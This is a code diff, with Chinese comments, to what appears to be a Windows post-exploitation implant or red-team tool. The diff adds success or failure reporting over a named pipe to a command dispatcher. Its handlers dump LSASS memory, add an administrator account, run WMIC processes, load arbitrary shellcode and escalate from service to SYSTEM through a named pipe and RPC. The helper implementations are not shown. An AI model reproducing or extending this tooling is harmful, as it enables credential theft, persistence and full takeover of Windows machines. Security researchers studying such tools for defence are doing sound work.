@@ -9,10 +9,12 @@
 #include <corecrt_wstdio.h>
 
 DWORD dwThreadId = 0;
-LPWSTR g_pwszCommandLine = NULL;
-HANDLE hSystemToken = INVALID_HANDLE_VALUE;
+
+LPWSTR g_pwszCommandLine = NULL; // 命令行
+HANDLE g_hSystemToken = INVALID_HANDLE_VALUE;
 PCHAR g_ShellcodeBuffer = NULL;
 DWORD g_dwShellcodeSize = 0;
+
 
 void* __RPC_USER midl_user_allocate(size_t size)
 {
@@ -23,6 +25,18 @@ void* __RPC_USER midl_user_allocate(size_t size)
 void __RPC_USER midl_user_free(void* p)
 {
     free(p);
+}
+
+
+void CheckSuccessAndSendMsg(BOOL bState,HANDLE hPipe) {
+    DWORD dwWrittenSize = 0;
+    CHAR Success[] = {0x01};
+    CHAR Failed[] = { 0x00 };
+    if (bState) {
+        WriteFile(hPipe, Success, 1, &dwWrittenSize, NULL);
+    }else{
+        WriteFile(hPipe, Failed, 1, &dwWrittenSize, NULL);
+    }
 }
 
 DWORD HandleCode(VOID) {
@@ -56,27 +70,68 @@ DWORD HandleCode(VOID) {
             switch (bMethod)
             {
             case METHOD_WMI_CREATE_PROCESS:
+                /// <summary>
+                /// 调用WMIC创建进程，无回显
+                /// 参数：process
+                /// </summary>
+                /// <param name=""></param>
+                /// <returns></returns>
                 ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
-                WMICCreateProcess(char2wchar(szBuffer));
+                CheckSuccessAndSendMsg(WMICCreateProcess(char2wchar(szBuffer)), hPipe);
                 break;
             case METHOD_MINIDUMP_LSASS:
-                MiniDumpLsass();
+                /// <summary>
+                /// 高权限的情况下转储Lsass进程内存
+                /// 参数：dump
+                /// </summary>
+                /// <param name=""></param>
+                /// <returns></returns>
+                CheckSuccessAndSendMsg(MiniDumpLsass(), hPipe);
                 break;
             case METHOD_ADD_USER:
-                CreateAdminUserInternal();
+                /// <summary>
+                /// 高权限的情况下添加用户
+                /// 参数：user
+                /// </summary>
+                /// <param name=""></param>
+                /// <returns></returns>
+                CheckSuccessAndSendMsg(CreateAdminUserInternal(), hPipe);
                 break;
             case METHOD_SHELL_CODE_LOADE:
+                /// <summary>
+                /// 执行Shellcode
+                /// 参数：code
+                /// </summary>
+                /// <param name=""></param>
+                /// <returns></returns>
                 ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
-                ExecuteShellCode(szBuffer, dwLen);
+                CheckSuccessAndSendMsg(ExecuteShellCode(szBuffer, dwLen), hPipe);
                 break;
-            case METHOD_GETSYSTEM: // system
-                ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
-                Service2System();
+            case METHOD_GETSYSTEM:
+                /// <summary>
+                /// 创建命名管道
+                /// 参数：system
+                /// </summary>
+                /// <param name=""></param>
+                /// <returns></returns>
+                CheckSuccessAndSendMsg(Service2System(), hPipe);
                 break;
-            case METHOD_SYSTEM_EXECUTE: // system-run
-                Execute();
+            case METHOD_SYSTEM_EXECUTE:
+                /// <summary>
+                /// 触发RPC连接提权管道
+                /// 参数：system-run
+                /// </summary>
+                /// <param name=""></param>
+                /// <returns></returns>
+                CheckSuccessAndSendMsg(Execute(), hPipe);
                 break;
-            case METHOD_SET_SYSTEM_SHELLCODE: // system-code
+            case METHOD_SET_SYSTEM_SHELLCODE:
+                /// <summary>
+                /// 设置全局Shellcode
+                /// 参数：system-code
+                /// </summary>
+                /// <param name=""></param>
+                /// <returns></returns>
                 ZeroMemory(szBuffer, BUFF_SIZE);
                 ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
                 g_ShellcodeBuffer = new char[dwLen];
@@ -84,6 +139,12 @@ DWORD HandleCode(VOID) {
                 g_dwShellcodeSize = dwLen;
                 break;
             case METHOD_UNSET_SYSTEM_SHELLCODE:
+                /// <summary>
+                /// 清空全局Shellcode
+                /// 参数：system-uncode
+                /// </summary>
+                /// <param name=""></param>
+                /// <returns></returns>
                 g_dwShellcodeSize = 0;
                 g_ShellcodeBuffer = NULL;
                 break;
